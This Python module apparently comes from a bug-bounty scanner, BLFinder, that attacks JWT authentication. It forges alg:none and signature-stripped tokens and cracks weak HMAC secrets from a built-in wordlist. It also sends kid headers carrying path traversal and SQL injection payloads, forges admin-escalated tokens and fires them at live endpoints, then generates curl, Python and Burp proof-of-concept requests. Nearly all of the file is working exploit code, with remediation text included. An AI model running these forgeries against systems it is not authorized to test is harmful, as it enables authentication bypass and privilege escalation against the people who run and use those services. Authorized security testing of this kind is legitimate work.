"""
BLFinder — core/modules/jwt_alg_confusion.py
JWT Algorithm Confusion & Signature Bypass Scanner

Tests the scan's configured bearer token (if it's JWT-shaped) for the
signature-verification bug classes that account for a disproportionate
number of critical JWT bounties, precisely because they're mechanical to
test but most backends never defend against them:

  1. `alg: none` bypass — forge a token with alg set to "none" / "None" /
     "NONE" (case-confusion variants) and an empty/absent signature.
     Some JWT libraries treat "none" as "skip verification" regardless of
     what the server originally issued.
  2. Signature stripping — keep the original header/payload/alg but send
     an empty signature segment. Confirms whether the server actually
     verifies the signature at all vs. just checking token shape.
  3. Weak HMAC secret cracking (HS256/HS384/HS512 only) — this check is
     fully offline and 100% verifiable: it computes the real HMAC over the
     token using a wordlist of common/weak secrets and compares the digest
     byte-for-byte against the token's actual signature. No network call,
     no ambiguity — if it matches, the secret is definitely the app's real
     signing key. On a hit, forges a privilege-escalated token (flips any
     role/admin/scope claim found) signed with the cracked secret and
     sends it live for confirmation.
  4. `kid` (Key ID) header injection — path-traversal and injection-style
     `kid` values designed to make the server resolve an empty or
     predictable signing key (the classic "kid: ../../../dev/null" /
     SQLi-in-kid trick), then signs HS256 with that expected empty key.
  5. Informational: flags RS256/ES256 tokens with a `jku`/`x5u` header as
     needing manual key-confusion / SSRF follow-up — full RSA key forgery
     needs a crypto library and infrastructure this tool doesn't assume
     you have, so it's surfaced rather than silently skipped.

Every "confirmed" finding here is verified against a live control request
(garbage token → expect 401/403) before being reported, so a target that
simply doesn't require auth on an endpoint won't produce a false JWT bypass.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
from urllib.parse import urlparse

from ..models import Finding, Severity, ProofOfConcept

# A short, high-signal list of secrets that show up constantly in real JWT
# HS256 deployments (default framework secrets, tutorial leftovers, and the
# usual weak-password suspects). Kept intentionally small — this is meant
# to catch the common, embarrassing case instantly, not replace a proper
# offline cracking session with rockyou.txt.
_WEAK_SECRETS = [
    "secret", "Secret", "SECRET", "secretkey", "secret_key", "jwtsecret",
    "jwt_secret", "jwtSecret", "your-256-bit-secret", "your-secret-key",
    "mysecretkey", "supersecret", "changeme", "changethis", "password",
    "Password1", "123456", "12345678", "qwerty", "letmein", "admin",
    "root", "test", "testing", "development", "dev", "production", "prod",
    "staging", "key", "apikey", "api_key", "signing-key", "signingkey",
    "s3cr3t", "keyboardcat", "correcthorsebatterystaple", "0", "null",
    "",  # empty secret — surprisingly common
]


class JWTAlgConfusionScanner:
    """
    Usage:
        jwt_scanner = JWTAlgConfusionScanner(scanner)
        findings = await jwt_scanner.scan(url, method)
        scanner.findings.extend(findings)
    """

    def __init__(self, scanner):
        self._scanner = scanner
        self._config = scanner.config
        self._request = scanner._request
        self._resp_ok = getattr(scanner, "_response_indicates_success", None)
        self._reported: set[tuple] = set()          # (token_hash, check_name)
        self._attempts: dict[tuple, int] = {}        # (token_hash, check_name) -> tries
        self._hmac_attempted: set[str] = set()        # token_hash — offline crack already tried
        self._control_cache: dict[str, bool] = {}     # url -> control passed (token rejected)
        self._max_attempts_per_check = 3              # retry across a few endpoints, then stop

    # ── Public API ───────────────────────────────────────────────────────────

    async def scan(self, url: str, method: str = "GET") -> list[Finding]:
        findings: list[Finding] = []
        token = getattr(self._config, "auth_token", "") or ""
        parsed_token = self._decode_jwt(token)
        if parsed_token is None:
            return findings

        header, payload, sig, header_b64, payload_b64 = parsed_token
        alg = str(header.get("alg", "")).upper()
        token_hash = hashlib.sha256(token.encode()).hexdigest()[:12]

        # Stop entirely once every applicable check for this token has
        # either found something or exhausted its retry budget — avoids
        # burning a control request on every remaining endpoint for the
        # rest of the scan once there's nothing left to learn.
        applicable_checks = ["alg_none", "sig_stripped"]
        if "kid" in header:
            applicable_checks.append("kid_injection")

        def _check_done(name: str) -> bool:
            return (
                (token_hash, name) in self._reported
                or self._attempts.get((token_hash, name), 0) >= self._max_attempts_per_check
            )

        live_checks_done = all(_check_done(c) for c in applicable_checks)
        hmac_check_done = (
            not alg.startswith("HS") or token_hash in self._hmac_attempted
        )
        if live_checks_done and hmac_check_done:
            return findings

        # Establish a control: does this endpoint even enforce auth?
        # If a garbage token already gets 200, forged-token acceptance here
        # would be meaningless — skip this endpoint for confirmation checks.
        control_ok = await self._control_rejects(url, method)
        if control_ok is None:
            return findings  # couldn't reach the endpoint at all
        if not control_ok and self._config.verbose:
            print(f"[!] JWTAlgConfusionScanner: {url} accepts garbage tokens — "
                  f"skipping confirmation checks (endpoint may not enforce auth)")

        # ── 1. alg:none ─────────────────────────────────────────────────────
        if control_ok:
            f = await self._try_check(
                url, method, token_hash, "alg_none",
                variants=self._forge_none_variants(header, payload),
                build=lambda forged: self._build(
                    url, method, token, forged,
                    title="JWT Algorithm Confusion — `alg: none` Accepted",
                    severity=Severity.CRITICAL, confidence=95,
                    cwe="CWE-347", cvss=9.8,
                    description=(
                        f"The API accepted a forged JWT with `alg` set to a `none` "
                        f"variant and no signature, on an endpoint that otherwise "
                        f"rejects unauthenticated/garbage tokens. This means the "
                        f"signature is not being verified at all when `alg: none` is "
                        f"present — an attacker can forge a token for **any user or "
                        f"role** by simply editing the payload, with no key required."
                    ),
                    recommendation=(
                        "Explicitly reject `alg: none` and enforce a fixed expected "
                        "algorithm when verifying — never trust the `alg` value from "
                        "the token itself to select the verification method."
                    ),
                    attack_note="alg:none case-confusion + empty signature",
                ),
            )
            if f:
                findings.append(f)

        # ── 2. Signature stripping (original alg, empty signature) ────────
        if control_ok:
            stripped = f"{header_b64}.{payload_b64}."
            f = await self._try_check(
                url, method, token_hash, "sig_stripped",
                variants=[stripped],
                build=lambda forged: self._build(
                    url, method, token, forged,
                    title="JWT Signature Not Verified — Empty Signature Accepted",
                    severity=Severity.CRITICAL, confidence=93,
                    cwe="CWE-347", cvss=9.1,
                    description=(
                        f"The API accepted a JWT with the original `{alg}` header and "
                        f"payload but an empty signature segment. The server is not "
                        f"verifying the signature — only checking that the token has "
                        f"the right shape — so any claim in the payload can be "
                        f"tampered with freely."
                    ),
                    recommendation=(
                        "Verify the signature on every request using a trusted key. "
                        "A missing or empty signature must always be rejected."
                    ),
                    attack_note="Signature segment stripped, header/payload unchanged",
                ),
            )
            if f:
                findings.append(f)

        # ── 3. Weak HMAC secret (fully offline, no live probe needed first) ─
        if alg.startswith("HS") and sig and token_hash not in self._hmac_attempted:
            self._hmac_attempted.add(token_hash)
            cracked = self._crack_hmac(header_b64, payload_b64, sig, alg)
            if cracked is not None:
                self._reported.add((token_hash, "weak_hmac_secret"))
                forged = self._forge_privileged(header, payload, cracked, alg)
                accepted = None
                if control_ok:
                    accepted = await self._probe(url, method, forged)
                findings.append(self._build(
                    url, method, token, forged,
                    title="JWT Signed with Weak/Guessable HMAC Secret",
                    severity=Severity.CRITICAL, confidence=99,
                    cwe="CWE-798", cvss=9.8,
                    description=(
                        f"The token's HMAC signature was reproduced offline using "
                        f"the weak secret `{cracked!r}` — this is a byte-for-byte "
                        f"match against the real signature, not a heuristic guess. "
                        f"Anyone with this wordlist can forge arbitrary tokens for "
                        f"any user, including elevated-privilege claims."
                        + (
                            " Live confirmation: a re-signed token with an escalated "
                            "role claim was accepted by the server."
                            if accepted else
                            " (Live re-confirmation on this endpoint was inconclusive "
                            "or the endpoint doesn't enforce auth — the offline HMAC "
                            "match itself is still definitive.)"
                        )
                    ),
                    recommendation=(
                        "Rotate the signing secret immediately to a high-entropy, "
                        "randomly generated value (32+ bytes), and never reuse "
                        "tutorial/default secrets in production."
                    ),
                    attack_note=f"Cracked secret: {cracked!r} (offline HMAC match)",
                ))

        # ── 4. kid header injection ─────────────────────────────────────────
        if control_ok and "kid" in header:
            f = await self._try_check(
                url, method, token_hash, "kid_injection",
                variants=self._forge_kid_variants(header, payload),
                build=lambda forged: self._build(
                    url, method, token, forged,
                    title="JWT `kid` Header Injection — Key Resolution Bypass",
                    severity=Severity.CRITICAL, confidence=90,
                    cwe="CWE-347", cvss=9.1,
                    description=(
                        f"The API accepted a forged token whose `kid` header was set "
                        f"to a path-traversal / injection payload designed to make "
                        f"key lookup resolve to an empty or predictable value, signed "
                        f"as HS256 accordingly. This indicates the `kid` value is used "
                        f"unsafely to locate the signing key (e.g. read from disk or "
                        f"looked up in a database) without validating it against an "
                        f"allow-list."
                    ),
                    recommendation=(
                        "Never use client-supplied `kid` values directly in file paths "
                        "or database queries. Validate `kid` against a fixed allow-list "
                        "of known key IDs before lookup."
                    ),
                    attack_note="kid path-traversal/injection, signed HS256 with empty key",
                ),
            )
            if f:
                findings.append(f)

        # ── 5. Informational: jku/x5u present on asymmetric tokens ─────────
        if alg in ("RS256", "RS384", "RS512", "ES256", "ES384", "ES512") and \
           ("jku" in header or "x5u" in header):
            key = (token_hash, "jku_x5u_info")
            if key not in self._reported:
                self._reported.add(key)
                field = "jku" if "jku" in header else "x5u"
                findings.append(self._build_info(
                    url, method, token,
                    title=f"JWT Uses `{field}` Header — Manual Key-Confusion/SSRF Review Needed",
                    description=(
                        f"This `{alg}` token includes a `{field}` header "
                        f"(`{header.get(field)}`), which some libraries fetch to "
                        f"retrieve the verification key *before* validating the "
                        f"signature. This is a known SSRF vector (point `{field}` at "
                        f"an attacker-controlled URL) and a key-confusion vector (host "
                        f"an attacker-controlled JWKS and self-sign a token with the "
                        f"matching private key). This tool doesn't attempt full RSA "
                        f"key forgery automatically — worth testing manually with "
                        f"jwt_tool or a Burp Collaborator-style listener on `{field}`."
                    ),
                ))

        return findings

    # ── Confirmation control ────────────────────────────────────────────────

    async def _control_rejects(self, url: str, method: str) -> bool | None:
        """Returns True if a garbage token is rejected (endpoint enforces
        auth, so a forged-token acceptance later would be meaningful).
        Returns False if garbage is accepted (endpoint doesn't gate on
        this token at all). Returns None if the endpoint is unreachable."""
        if url in self._control_cache:
            return self._control_cache[url]
        garbage = "eyJhbGciOiJIUzI1NiJ9.eyJub3QiOiJhX3JlYWxfdG9rZW4ifQ.deadbeef"
        try:
            status, _, body, _ = await self._request(
                method, url, token_override=garbage
            )
        except Exception as e:
            if self._config.verbose:
                print(f"[!] JWTAlgConfusionScanner control probe on {url}: {e}")
            return None
        if status == 0:
            return None
        rejects = status in (401, 403) or not self._looks_ok(body, status)
        self._control_cache[url] = rejects
        return rejects

    async def _probe(self, url: str, method: str, forged_token: str) -> bool:
        try:
            status, _, body, _ = await self._request(
                method, url, token_override=forged_token
            )
        except Exception:
            return False
        if status == 0:
            return False
        return status in (200, 201) and self._looks_ok(body, status)

    def _looks_ok(self, body: str, status: int) -> bool:
        if self._resp_ok:
            return self._resp_ok(body, status)
        if not body:
            return False
        lower = body.lower()
        return status in (200, 201) and not any(
            s in lower for s in ("unauthorized", "forbidden", "invalid token", "error")
        )

    async def _try_check(self, url, method, token_hash, check_name, variants, build):
        key = (token_hash, check_name)
        if key in self._reported:
            return None
        tries = self._attempts.get(key, 0)
        if tries >= self._max_attempts_per_check:
            return None
        self._attempts[key] = tries + 1

        for forged in variants:
            if await self._probe(url, method, forged):
                self._reported.add(key)
                return build(forged)
        return None

    # ── JWT parsing / forging ───────────────────────────────────────────────

    def _b64url_encode(self, data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    def _b64url_decode(self, s: str) -> bytes:
        padding = "=" * (-len(s) % 4)
        return base64.urlsafe_b64decode(s + padding)

    def _decode_jwt(self, token: str):
        if not token or token.count(".") not in (1, 2):
            return None
        parts = token.split(".")
        if len(parts) < 2:
            return None
        try:
            header = json.loads(self._b64url_decode(parts[0]))
            payload = json.loads(self._b64url_decode(parts[1]))
        except Exception:
            return None
        if not isinstance(header, dict) or "alg" not in header:
            return None
        sig = parts[2] if len(parts) == 3 else ""
        return header, payload, sig, parts[0], parts[1]

    def _encode_header_payload(self, header: dict, payload: dict) -> tuple[str, str]:
        h_b64 = self._b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        p_b64 = self._b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        return h_b64, p_b64

    def _forge_none_variants(self, header: dict, payload: dict) -> list[str]:
        variants = []
        for alg_val in ("none", "None", "NONE", "nOnE"):
            h = dict(header)
            h["alg"] = alg_val
            h_b64, p_b64 = self._encode_header_payload(h, payload)
            variants.append(f"{h_b64}.{p_b64}.")   # trailing empty signature
            variants.append(f"{h_b64}.{p_b64}")    # no signature segment at all
        return variants

    def _forge_kid_variants(self, header: dict, payload: dict) -> list[str]:
        kid_payloads = [
            "../../../../../../../dev/null",
            "../../../../../../../../dev/null",
            "/dev/null",
            "' UNION SELECT 'x'-- -",
            "0",
        ]
        variants = []
        for kid_val in kid_payloads:
            h = dict(header)
            h["alg"] = "HS256"
            h["kid"] = kid_val
            h_b64, p_b64 = self._encode_header_payload(h, payload)
            sig = self._hmac_sign(b"", h_b64, p_b64, hashlib.sha256)
            variants.append(f"{h_b64}.{p_b64}.{sig}")
        return variants

    def _hmac_sign(self, secret: bytes, header_b64: str, payload_b64: str, hashalg) -> str:
        msg = f"{header_b64}.{payload_b64}".encode()
        digest = hmac.new(secret, msg, hashalg).digest()
        return self._b64url_encode(digest)

    def _crack_hmac(self, header_b64: str, payload_b64: str, target_sig: str, alg: str) -> str | None:
        hashalg = {
            "HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512,
        }.get(alg, hashlib.sha256)
        for secret in _WEAK_SECRETS:
            if self._hmac_sign(secret.encode(), header_b64, payload_b64, hashalg) == target_sig:
                return secret
        return None

    def _forge_privileged(self, header: dict, payload: dict, secret: str, alg: str) -> str:
        p = dict(payload)
        escalation_map = {
            "role": "admin", "roles": ["admin"], "is_admin": True, "isAdmin": True,
            "admin": True, "user_type": "admin", "type": "admin",
            "scope": "admin", "scopes": ["admin"], "permissions": ["*"],
        }
        for k, v in escalation_map.items():
            if k in p:
                p[k] = v
        h_b64, p_b64 = self._encode_header_payload(header, p)
        hashalg = {
            "HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512,
        }.get(alg, hashlib.sha256)
        sig = self._hmac_sign(secret.encode(), h_b64, p_b64, hashalg)
        return f"{h_b64}.{p_b64}.{sig}"

    # ── Finding construction ────────────────────────────────────────────────

    def _build(
        self, url, method, original_token, forged_token,
        title, severity, confidence, cwe, cvss, description, recommendation,
        attack_note,
    ) -> Finding:
        host = urlparse(url).netloc
        path = urlparse(url).path or "/"

        curl = (
            f'curl -sk -X {method} "{url}" \\\n'
            f'  -H "Authorization: Bearer {forged_token}"'
        )
        python_script = (
            "import requests\n\n"
            f'url = "{url}"\n'
            f'forged_token = "{forged_token}"\n'
            f'r = requests.request("{method}", url, '
            f'headers={{"Authorization": f"Bearer {{forged_token}}"}})\n'
            "print(r.status_code)\n"
            "print(r.text[:500])\n"
        )
        burp = (
            f"{method} {path} HTTP/1.1\n"
            f"Host: {host}\n"
            f"Authorization: Bearer {forged_token}\n"
            f"Connection: close\n\n"
        )
        poc = ProofOfConcept(
            summary=f"{attack_note} — server accepted the forged token",
            curl_command=curl,
            python_script=python_script,
            burp_request=burp,
            expected_result=(
                "Server responds 200/201 with authenticated data for the forged "
                "token, identical in kind to a request made with a legitimate token."
            ),
            steps=[
                "Send the forged JWT above in the Authorization header.",
                "Confirm the response contains authenticated data, not an "
                "unauthorized/forbidden error.",
                "Compare against the control request (garbage token), which "
                "was rejected — proving this is a genuine bypass, not an "
                "unauthenticated endpoint.",
            ],
        )

        finding = Finding(
            title=title,
            severity=severity,
            category="Authentication — JWT Algorithm Confusion",
            description=description,
            request={
                "method": method, "url": url,
                "headers": {"Authorization": f"Bearer {forged_token}"},
            },
            response_summary="Forged token accepted as valid authentication",
            evidence=(
                f"Original token (truncated): {original_token[:40]}... | "
                f"Forged token (truncated): {forged_token[:60]}... | "
                f"{attack_note}"
            ),
            recommendation=recommendation,
            cwe=cwe, cvss=cvss,
            owasp="API2:2023 Broken Authentication",
            confirmed=True,
            confidence=confidence,
            confidence_reasons=[attack_note, "Confirmed against live control request"],
            endpoint=url,
            parameter="Authorization header (JWT)",
        )
        finding.poc = poc
        return finding

    def _build_info(self, url, method, token, title, description) -> Finding:
        finding = Finding(
            title=title,
            severity=Severity.INFO,
            category="Authentication — JWT Algorithm Confusion",
            description=description,
            request={"method": method, "url": url},
            response_summary="Informational — manual follow-up recommended",
            evidence=f"Token header exposes jku/x5u on an asymmetric-alg JWT",
            recommendation=(
                "Restrict jku/x5u to an allow-list of trusted URLs, or remove "
                "reliance on client-supplied key-location headers entirely."
            ),
            cwe="CWE-347", cvss=0.0,
            owasp="API2:2023 Broken Authentication",
            confirmed=False,
            confidence=50,
            endpoint=url,
            parameter="Authorization header (JWT)",
        )
        return finding
